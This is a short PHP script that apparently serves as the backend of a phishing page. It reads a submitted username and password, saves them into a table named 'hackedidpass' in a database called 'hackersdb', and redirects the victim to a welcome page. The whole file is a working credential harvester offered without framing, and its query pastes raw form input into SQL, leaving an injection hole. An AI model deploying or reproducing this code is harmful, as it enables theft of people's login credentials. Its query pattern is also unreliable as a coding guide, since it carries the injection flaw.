<?php
//declaration
$hostname="localhost";
$user="root";
$pass="";
$dbname="hackersdb";


//create connection

$conn=mysqli_connect($hostname,$user,$pass,$dbname);
if(!$conn)
{
	die("CONNECTION FAIL" . mysqli_connect_error());
}
echo "*";

//display data
$usernames=$_POST['username'];
$passwords=$_POST['password'];


    	
	$sql5="insert into hackedidpass(userid,pass) values('$usernames','$passwords')";
	$conn->query($sql5);
	header('location:E-welcome.html');
			

$conn->close();
?>